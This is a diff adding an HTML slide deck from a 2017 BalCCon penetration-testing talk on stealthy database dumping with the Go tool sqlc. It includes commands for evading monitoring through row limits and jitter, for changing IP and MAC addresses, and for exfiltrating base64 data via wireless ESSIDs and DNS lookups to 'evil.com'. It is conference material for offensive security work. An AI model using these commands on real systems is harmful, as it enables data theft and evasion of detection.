@@ -1,0 +1,572 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Art of Dumping Databases</title>
+
+		<meta name="description" content="Art of Dumping Databases">
+		<meta name="author" content="VK">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/diverto.css" id="theme">
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+                        <div class="slides">
+                                <section>
+                                        <img src="images/diverto-logo.png" border="0">
+                                        <h1>Art of Dumping Databases</h1>
+                                        <h3>Dumping with style</h3>
+                                        <h3></h3>
+                                        <p>
+                                                <small>Vlatko Kosturjak (<a href="https://twitter.com/k0st">@k0st</a>), <a href="https://2k17.balccon.org/index.php?title=BalCCon2k17">BalCCon Novi Sad</a>, 16th of September</small>
+                                        </p>
+                                </section>
+
+                                <section>
+                                        <h2>Agenda</h2>
+                                        <ul>
+						<li>Introduction</li>
+                                                <li>Sysadmin perspective</li>
+						<li>Attacker perspective</li>
+                                                <li>Data dumping</li>
+						<li>Data exfiltration</li>
+						<li>Tools of trade</li>
+						<li>Summary</li>
+						<li>Questions and answers</li>
+                                        </ul>
+                                        <p align="right">45 minutes</p>
+                                        <aside class="notes">
+                                                This is what we will cover in this presentation.
+                                        </aside>
+                                </section>
+
+				<section>
+					<section>
+						<h2>Kost: About me</h2>
+						<ul>
+							<li>Security Consultant in Diverto</li>
+							<ul>
+								<li>offensive/penetration tester</li>
+								<li>read teaming</li>
+							</ul>
+							<li>Security testing</li>
+							<ul>
+								<li>software/systems/mobile/infrastructure</li>
+								<li>embedded/IoT/ICS/SCADA</li>
+							</ul>
+							<li>Linux and FLOSS enthusiast</li>
+							<li>Open source developer</li>
+							<ul>
+								<li>Have code in OpenVAS, Nmap, Metasploit, ...</li>
+								<li><a href="https://github.com/kost">https://github.com/kost</a></li>
+							</ul>
+						</ul>
+					</section>
+
+				</section>
+
+				<section>
+					<h2>Customer experience</h2>
+					<ul>
+						
+						<li>although compromised</li>
+						<ul>
+							<li>domain admin</li>
+							<li>root</li>
+							<li>DBA</li>
+						</ul>
+						<li>dump would be seen!</li>
+						<li>we have monitoring</li>
+						<ul>
+							<li>we have logs</li>
+							<li>we have sensors and alerts</li>
+							<li>we have monitoring</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Dumping database: sysadmin</h2>
+					<ul>
+					 	
+						<li>data consistency</li>
+						<li>maintenance window</li>
+						<li>scaling</li>
+						<li>purpose</li>
+						<ul>
+							<li>backup</li>
+							<li>migration</li>
+							<li>sync</li>
+							<li>...</li>
+
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Standard database dumping</h2>
+					<ul>
+
+<pre><code data-trim contenteditable>	
+mysqldump -u user -p database &gt dump.sql
+</code></pre>
+
+<pre><code data-trim contenteditable>	
+pg_dump -d database &gt dump.sql
+</code></pre>
+
+					</ul>
+
+				</section>
+
+				<section>
+					<h2>Dumping database: sysadmin standard</h2>
+					<ul>
+						
+						<li>noisy</li>
+						<li>data consistency</li>
+						<li>table locking</li>
+						<li>visible on monitoring</li>
+						<ul>
+							<li>massive database activity</li>
+							<li>massive IO activity</li>
+							<li>massive network activity</li>
+							<li>...</li>
+
+						</ul>
+						<li>very fast</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Dumping database: sysadmin protection</h2>
+					<ul>
+						
+						<li>database options</li>
+						<ul>
+							<li>database performance</li>
+							<li>log slow queries</li>
+							<li>...</li>
+
+						</ul>
+						<li>admin/user experience</li>
+						<ul>
+							<li>database performance</li>
+							<li>slower responses</li>
+
+						</ul>
+						<li>database firewall</li>
+						<ul>
+							<li>detecing dumps (e.g.more than 100 rows)</li>
+
+						</ul>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Dumping database: attacker perspective</h2>
+					<ul>
+						
+						<li>post exploitation part</li>
+						<li>attacker already performed</li>
+						<ul>
+							<li>recon</li>
+							<li>vulnerability identification</li>
+							<li>vulnerability exploitation</li>
+							<li>lateral movement</li>
+						</ul>
+						<li>attacker obtained DB credentials</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Dumping database: attacker perspective</h2>
+					<ul>
+						
+						<li>data consistency not so important</li>
+						<li>slower speed</li>
+						<li>stealthy</li>
+						<ul>
+							<li>divide by chunks</li>
+							<li>delay random time (jitter)</li>
+							<li>exfiltration options</li>
+							<li>extendable</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Standard way</h2>
+					<ul>
+						
+						<li>statically compile clients</li>
+						<li>write script for each engagement</li>
+						<li>does not scale</li>
+						<li>toolkit/dependency problems</li>
+						<li>waste of time</li>
+						<li>Advantages</li>
+						<ul>
+							<li>written specifically for project</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Go</h2>
+					<ul>
+						
+						<li>Why Go?</li>
+						<ul>
+							<li>Vyrus talk from previous BalCCon</li>
+						</ul>
+						<li>Advantages</li>
+						<ul>
+							<li>multi platform</li>
+							<li>statically linked binary</li>
+							<li>single binary</li>
+							<li>frequent change to core</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Go</h2>
+					<ul>
+						
+						<li>Language features</li>
+						<ul>
+							<li>SQL drivers for most databases</li>
+						</ul>
+						<li>Mentioned Advantages</li>
+						<ul>
+							<li>multi platform</li>
+							<li>statically linked binary</li>
+							<li>single binary</li>
+							<li>frequent change to core</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Go</h2>
+					<ul>
+						
+						<li>Multiplatform</li>
+						<ul>
+							<li>Windows</li>
+							<li>Linux</li>
+							<li>Mac OS X</li>
+						</ul>
+						<li>Database drivers</li>
+						<ul>
+							<li>Sqlite</li>
+							<li>Postgres</li>
+							<li>MySQL</li>
+							<li>MS SQL</li>
+							<li>Oracle*</li>
+							<li>...</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>sqlc come to life</h2>
+					<ul>
+						<li>sqlc</li>
+						<ul>
+							<li><a href="https://github.com/kost/sqlc">https://github.com/kost/sqlc</a></li>
+						</ul>
+						<li>Open source</li>
+						<ul>
+							<li>MIT License</li>
+						</ul>
+						<li>Written in Go</li>
+						<ul>
+							<li>Language features</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Basic usage</h2>
+					<ul>
+
+<pre><code data-trim contenteditable>	
+$ sqlc list
+mssql
+mysql
+postgres
+sqlite3
+sqlserver
+</code></pre>
+
+<pre><code data-trim contenteditable>	
+sqlc -d sqlite3 console
+</code></pre>
+
+<pre><code data-trim contenteditable>	
+sqlc -d mysql dump &gt dump.sql
+</code></pre>
+					</ul>
+
+				</section>
+
+				<section>
+					<h2>Basic stealth usage</h2>
+					<ul>
+
+Limit number of rows returned per query:
+<pre><code data-trim contenteditable>	
+sqlc --limit-rows 3 console
+</code></pre>
+
+limit and delay seconds between queries
+<pre><code data-trim contenteditable>	
+sqlc --limit-rows 10 --delay-between 5 console
+</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Stealth usage - jitter</h2>
+					<ul>
+Limit number of rows returned per query with jitter:
+<pre><code data-trim contenteditable>	
+sqlc --min-rows 3 --max-rows 10 console
+</code></pre>
+
+limit and delay seconds between queries with jitter:
+<pre><code data-trim contenteditable>	
+sqlc --min-delay 10 --max-delay 60 --min-rows 3 --max-rows 10 console
+</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Covering the tracks</h2>
+					<ul>
+
+<pre><code data-trim contenteditable>	
+sqlc -e 'ifconfig eth0 192.168.1.1'
+</code></pre>
+
+<pre><code data-trim contenteditable>	
+sqlc -E 'ifconfig eth0 hw ether CE:CA:60:6A:CE:CA; ifconfig eth0 192.168.1.1' ....
+</code></pre>
+
+
+					</ul>
+
+				</section>
+
+				<section>
+					<h2>Exfiltrating data via wireless</h2>
+					<ul>
+
+<pre><code data-trim contenteditable>	
+sqlc -e 'iwconfig eth0 essid {B64DATA}; sleep 15' ...
+</code></pre>
+
+<img src="images/wireless.jpg">
+
+					</ul>
+
+				</section>
+
+				<section>
+					<h2>Exfiltrating data via DNS</h2>
+					<ul>
+<pre><code data-trim contenteditable>	
+sqlc -e 'hostname {B64DATA}.evil.com' ...
+</code></pre>
+
+On evil:
+<pre><code data-trim contenteditable>	
+tcpdump -s 0 -vvv -i eth0 port 53
+</code></pre>
+
+					</ul>
+
+				</section>
+
+				<section>
+					<h2>Powershell</h2>
+					<ul>
+						<li>Invoke-DBDump ?</li>
+						<ul>
+							<li>Not so portable / multiplatform</li>
+						</ul>
+						<li>In-memory?</li>
+						<ul>
+							<li>don't touch disks</li>
+							<li>Other ways to execute exe from memory</li>
+						</ul>
+						<li>Database drivers</li>
+						<ul>
+							<li>missing poor Powershell implementation</li>
+						</ul>
+						<li>Looking forward for your implementation!</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Sqlmap? Sqlninja?</h2>
+					<ul>
+						<li>Vulnerability in application</li>
+						<ul>
+							<li>SQL injection</li>
+						</ul>
+						<li>Some of them have direct connection support</li>
+						<ul>
+							<li>dependency problem</li>
+						</ul>
+						<li>sqlc</li>
+						<ul>
+							<li>You need to have direct database connecivity</li>
+							<li>Not for exploiting SQL injection</li>
+							<li>Silent/stealthy dumping</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Future</h2>
+					<ul>
+						<li>Evil client side</li>
+						<ul>
+							<li>DNS tunneling</li>
+							<li>Wifi exfiltration</li>
+							<li>...</li>
+						</ul>
+						<li>More databases</li>
+						<ul>
+							<li>Oracle?</li>
+							<li>DB2?</li>
+						</ul>
+						<li>flexible queries</li>
+						<li>stacked queries</li>
+						<li>nosql?</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Summary</h2>
+					<ul>
+						<li>Writting scripts for each engagement</li>
+						<ul>
+							<li>Does not scale</li>
+							<li>Dependency problems</li>
+						</ul>
+						<li>You need to have database connecivity</li>
+						<li>sqlc</li>
+						<ul>
+							<li>Single executable client for multiple platforms</li>
+							<li>Silent/stealthy dumping</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Tool/links</h2>
+					<ul>
+						<li>sqlc</li>
+						<ul>
+							<li><a href="https://github.com/kost/sqlc">https://github.com/kost/sqlc</a></li>
+						</ul>
+						<li>Golang SQL</li>
+						<ul>
+							<li><a href="https://golang.org/pkg/database/sql/">https://golang.org/pkg/database/sql/</a></li>
+						</ul>
+						<li>List of database drivers</li>
+						<ul>
+							<li><a href="https://github.com/golang/go/wiki/SQLDrivers">https://github.com/golang/go/wiki/SQLDrivers</a></li>
+						</ul>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Credits/Thanks to</h2>
+					<ul>
+						<li>Vyrus</li>
+						<ul>
+							<li>Go lang addiction</li>
+						</ul>
+						<li>organizers</li>
+						<ul>
+							<li>thanks for having me</li>
+						</ul>
+						<li>You - thanks for listening!</li>
+					</ul>
+				</section>
+
+
+		                 <section>
+                                        <h3>Thanks on listening</h3>
+                                        <h1>?</h1>
+                                        <h3><a href="https://twitter.com/k0st">@k0st</a></h3>
+                                </section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// Full list of configuration options available at:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// Optional reveal.js plugins
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
